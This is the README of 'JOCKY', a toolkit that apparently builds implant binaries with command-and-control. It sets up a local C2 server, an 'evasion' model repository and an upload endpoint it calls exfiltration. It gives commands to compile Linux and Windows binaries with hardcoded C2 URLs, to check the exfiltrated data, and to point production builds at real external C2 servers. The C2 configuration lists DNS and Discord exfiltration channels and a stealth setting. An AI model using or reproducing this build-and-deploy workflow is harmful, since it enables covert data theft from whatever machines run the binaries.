# JOCKY Local Development Environment

Complete Docker-based local development setup with C2 server, model repository, and CDN endpoint.

## Quick Start

```bash
# 1. Compile your research chain (one command!)
./scripts/build_local.sh examples/research_chain_linux_production.jky build/local --platform linux

# 2. Binary is ready in: build/local/research_chain_linux_production
```

That's it! Docker services start automatically, environment variables are set, and compilation happens with embedded local URLs.

---

## What Gets Set Up

### Services Started by `build_local.sh`

| Service | URL | Purpose |
|---------|-----|---------|
| **C2 Server** | http://localhost:5000 | Configuration endpoint (`/api/config`) |
| **Model Repo** | http://localhost:5001 | ML model hosting (`/models/`) |
| **CDN Endpoint** | http://localhost:5080 | Data exfiltration endpoint (`/upload`) |

### Environment Variables (Automatically Set)

```bash
JOCKY_C2_PRIMARY="http://localhost:5000/api/config"
JOCKY_C2_FALLBACK="http://localhost:5000/api/config"
JOCKY_MODEL_REPO="http://localhost:5001/models/"
JOCKY_BUILD_ID="local_dev_1727628123"  # Auto-generated from timestamp
```

These are **automatically embedded in the binary** during compilation.

---

## Prerequisites

```bash
# Must have Docker and Docker Compose installed
docker --version
docker-compose --version

# Start Docker daemon if not already running
# On Linux: systemctl start docker
# On Mac: open -a Docker
# On Windows: Open Docker Desktop
```

---

## Usage

### Basic Build (Linux)

```bash
cd /home/incharanew/JOCKY
./scripts/build_local.sh examples/research_chain_linux_production.jky build/local --platform linux
```

### Windows Build

```bash
./scripts/build_local.sh examples/research_chain_linux_production.jky build/local --platform windows
```

### Custom Script

```bash
# Build with your own research chain script
./scripts/build_local.sh examples/my_custom_chain.jky build/my_build --platform linux
```

---

## What Happens During Build

```
1. Docker services start (C2, Model Repo, CDN)
   ↓
2. Script waits for services to be ready
   ↓
3. Environment variables set to localhost URLs
   ↓
4. compile_pipeline.py called with:
   - Source script
   - Output directory
   - Platform (linux/windows)
   - Environment variables (embedded at compile time)
   ↓
5. Binary created with configuration hardcoded inside
```

---

## File Structure

```
JOCKY/
├── docker-compose.yml          # Main application services
├── docker-compose.dev.yml      # Local dev services (C2, models, CDN)
├── scripts/
│   ├── build_local.sh          # Main build wrapper (run this!)
│   ├── c2_server.py            # C2 server implementation
│   ├── Caddyfile.models        # Model repo config
│   ├── Caddyfile.cdn           # CDN config
│   └── compile_pipeline.py     # Main compiler (called by build_local.sh)
├── models/                      # Store .gguf files here
├── build/
│   ├── local/                  # Output binaries (auto-created)
│   └── uploads/                # Exfiltrated data (auto-created)
└── examples/
    ├── research_chain_linux_production.jky
    └── (your custom scripts here)
```

---

## How It Works

### Binary Execution Flow

When the compiled binary runs anywhere (local machine, remote VM, etc.):

```
1. Binary starts with hardcoded config
   - C2 Primary: http://localhost:5000/api/config
   - C2 Fallback: http://localhost:5000/api/config
   - Model Repo: http://localhost:5001/models/
   - Build ID: local_dev_1727628123

2. Contacts C2 server for runtime configuration
   ↓
3. C2 responds with:
   {
     "cdn_endpoint": "http://jocky-cdn:80/upload",
     "cdn_token": "Bearer local_development_token_xyz_123",
     "model_url": "http://jocky-models/models/phi3_evasion_linux.gguf",
     "exfil_channels": ["cdn", "dns", "discord"]
   }

4. Downloads model if missing
   ↓
5. Executes research chain
   ↓
6. Exfiltrates data to CDN endpoint
```

---

## Viewing Logs

### C2 Server Logs

```bash
docker-compose -f docker-compose.dev.yml logs c2-server

# Follow in real-time
docker-compose -f docker-compose.dev.yml logs -f c2-server
```

### Model Repository Logs

```bash
docker-compose -f docker-compose.dev.yml logs model-repo
```

### CDN Endpoint Logs

```bash
docker-compose -f docker-compose.dev.yml logs cdn-endpoint
```

### All Services

```bash
docker-compose -f docker-compose.dev.yml logs
```

---

## Exfiltrated Data

When the binary runs and exfiltrates data to the CDN:

```bash
# View uploaded files
ls -lah build/uploads/

# Check file size
du -sh build/uploads/*

# View contents (if text)
cat build/uploads/exfil_*.txt
```

---

## Stopping Services

```bash
# Stop all services
docker-compose -f docker-compose.dev.yml down

# Stop and remove volumes (clean state)
docker-compose -f docker-compose.dev.yml down -v

# Stop one service
docker-compose -f docker-compose.dev.yml stop c2-server
```

---

## Restarting Services

```bash
# If services are already running and you want to restart
docker-compose -f docker-compose.dev.yml restart

# Or stop and start
docker-compose -f docker-compose.dev.yml down && docker-compose -f docker-compose.dev.yml up -d
```

---

## Testing the Setup

### Test C2 Configuration Endpoint

```bash
curl http://localhost:5000/api/config | jq
```

Expected response:
```json
{
  "cdn_endpoint": "http://jocky-cdn:80/upload",
  "cdn_token": "Bearer local_development_token_xyz_123",
  "model_url": "http://jocky-models/models/phi3_evasion_linux.gguf",
  "model_hash": "sha256:local_development_hash",
  "exfil_channels": ["cdn", "dns", "discord"],
  "max_operations": 1000,
  "timeout_ms": 60000,
  "stealth_level": "development"
}
```

### Test Model Repository

```bash
# Check if models directory is accessible
curl http://localhost:5001/

# Try to download a model (if you've added one)
curl -O http://localhost:5001/models/phi3_evasion_linux.gguf
```

### Test CDN Endpoint

```bash
# Upload a test file
echo "test data" > /tmp/test.txt
curl -X POST -F "file=@/tmp/test.txt" http://localhost:5080/upload

# Files should appear in build/uploads/
ls build/uploads/
```

---

## Adding ML Models

To test model auto-download functionality:

```bash
# Download Phi-3 model (requires ~2GB space)
# From: https://huggingface.co/microsoft/Phi-3-mini

# Copy to models directory
cp phi3_evasion_linux.gguf models/

# When you build, the binary can now download it
./scripts/build_local.sh examples/research_chain_linux_production.jky build/local
```

---

## Environment Variables Reference

### What Each Variable Does

| Variable | Set By | Used For | Example |
|----------|--------|----------|---------|
| `JOCKY_C2_PRIMARY` | build_local.sh | Hardcoded in binary | `http://localhost:5000/api/config` |
| `JOCKY_C2_FALLBACK` | build_local.sh | Fallback C2 | `http://localhost:5000/api/config` |
| `JOCKY_MODEL_REPO` | build_local.sh | Model download URL | `http://localhost:5001/models/` |
| `JOCKY_BUILD_ID` | build_local.sh | Unique build identifier | `local_dev_1727628123` |

### For Production Builds (Without Docker)

When you want to use **real** external servers:

```bash
export JOCKY_C2_PRIMARY="https://your-real-c2.com/api/config"
export JOCKY_C2_FALLBACK="https://backup-c2.com/api/config"
export JOCKY_MODEL_REPO="https://your-models.com/models/"
export JOCKY_BUILD_ID="production_linux_001"

# Use the standard build wrapper (not build_local.sh)
./scripts/build_with_config.sh examples/research_chain_linux_production.jky build/prod
```

---

## Troubleshooting

### "Docker is not running"

```bash
# Start Docker
# On Linux
sudo systemctl start docker

# On Mac
open -a Docker

# On Windows
# Open Docker Desktop application
```

### Services fail to start

```bash
# Check Docker images
docker images

# Pull latest images
docker-compose pull

# Check Docker disk space
docker system df

# Clean up old images
docker system prune -a
```

### Port already in use

```bash
# If ports 5000, 5001, 5080 are in use
# Find what's using them
lsof -i :5000
lsof -i :5001
lsof -i :5080

# Kill the process or change port in docker-compose.yml
```

### C2 Server won't respond

```bash
# Check if Flask is installed in container
docker-compose exec c2-server pip install flask

# Restart service
docker-compose restart c2-server

# Check logs
docker-compose logs c2-server
```

### Model repository returns 404

```bash
# Check if models directory exists
ls -la models/

# Check what's in the container
docker-compose exec model-repo ls -la /usr/share/caddy/models/

# Add a placeholder file
echo "test" > models/test.txt
docker-compose restart model-repo
```

---

## Next Steps

1. **Build your first binary:**
   ```bash
   ./scripts/build_local.sh examples/research_chain_linux_production.jky build/local --platform linux
   ```

2. **Test the binary:**
   ```bash
   ./build/local/research_chain_linux_production
   ```

3. **Monitor exfiltration:**
   ```bash
   ls -lah build/uploads/
   ```

4. **Check C2 logs:**
   ```bash
   docker-compose logs c2-server
   ```

---

## Architecture Diagram

```
┌─────────────────────────────────────────────────────────┐
│         Your Machine (Host)                              │
│                                                           │
│  ┌──────────────────────────────────────────────────┐   │
│  │  Docker Environment                              │   │
│  │                                                   │   │
│  │  ┌─────────────┐  ┌─────────────┐  ┌─────────┐  │   │
│  │  │ C2 Server   │  │Model Repo   │  │ CDN     │  │   │
│  │  │:5000        │  │ :5001       │  │ :5080   │  │   │
│  │  └─────────────┘  └─────────────┘  └─────────┘  │   │
│  │        ▲                                 ▲       │   │
│  │        │                                 │       │   │
│  └────────┼─────────────────────────────────┼───────┘   │
│           │                                 │            │
│  ┌────────┴─────────────────────────────────┴────┐      │
│  │                                                 │      │
│  │  Compiled Binary (with hardcoded URLs)        │      │
│  │  - C2 Primary: localhost:5000                 │      │
│  │  - Model Repo: localhost:5001                 │      │
│  │  - CDN: localhost:5080                        │      │
│  │                                                 │      │
│  └─────────────────────────────────────────────────┘     │
│                                                           │
│  ┌─────────────────────────────────────────────────┐    │
│  │ File System                                      │    │
│  │ - build/local/binary           (compiled)       │    │
│  │ - build/uploads/               (exfiltrated)    │    │
│  │ - models/                      (ML models)      │    │
│  └─────────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────────┘
```

---

## Performance Notes

- **First build:** ~30-60 seconds (Docker pulls images)
- **Subsequent builds:** ~10-20 seconds (services already running)
- **Services use:** ~500 MB RAM, ~1 GB disk space

---

## Security for Local Development

⚠️ **This setup is for LOCAL DEVELOPMENT ONLY**

- No authentication on C2 server
- HTTP only (no HTTPS)
- All URLs point to localhost
- Should NOT be used for production

For production, use `build_with_config.sh` with real HTTPS endpoints.
